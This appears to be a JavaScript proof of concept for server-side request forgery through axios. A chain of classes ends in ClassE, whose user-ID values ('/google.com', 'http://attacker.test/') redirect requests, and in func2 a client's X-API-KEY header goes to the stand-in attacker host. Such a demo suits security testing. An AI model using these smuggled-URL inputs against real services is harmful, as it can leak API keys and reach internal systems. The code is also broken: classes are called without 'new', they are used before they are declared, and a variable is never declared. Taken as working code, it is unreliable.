import axios from 'axios';


function makeAPICall(){
        let classA = ClassA(axios);
        classA.func1()
}

makeAPICall()



class ClassA {
    constructor(axios) {
        this.axios = axios.create({
            baseURL: 'https://userapi.example.com',
        });
    }
    func1() {
        let classB = ClassB(this.axios);
        classB.func1()
    }
}

class ClassB {
    constructor(axios) {
        this.axios = axios.create({
            baseURL: 'https://userapi.example.com',
        });
    }
    func1() {
        let classc = ClassC(this.axios);
        classc.func1()

    }

}

class ClassC {
    constructor(axios) {
        this.axios = axios.create({
            baseURL: 'https://userapi.example.com',
        });
    }
    func1() {
        let classD = ClassD(this.axios);
        classD.func1()
    }
}

class ClassD {
    constructor(axios) {
        this.axios = axios.create({
            baseURL: 'https://userapi.example.com',
        });
    }
    func1() {
        let classE = ClassE(this.axios);
        classE.func1()

    }

}

class ClassE {
    constructor(axios) {
        this.axios = axios.create({
            baseURL: 'https://userapi.example.com',
        });
    }
    func1() {
        //userId = '12345';
        userId = '/google.com'
        this.axios.get(`/${userId}`).then(function (response) {
            console.log(`config.baseURL:  ${response.config.baseURL}`);
            console.log(`config.method:   ${response.config.method}`);
            console.log(`config.url:      ${response.config.url}`);
            console.log(`res.responseUrl: ${response.request.res.responseUrl}`);
        });
    }
    func2() {
        const internalAPIClient = axios.create({
            baseURL: "http://example.test/api/v1/users/",
            headers: {
                "X-API-KEY": "1234567890",
            },
        });
        // const userId = "123";
        const userId = "http://attacker.test/";

        internalAPIClient.get(userId); // SSRF
    }

}






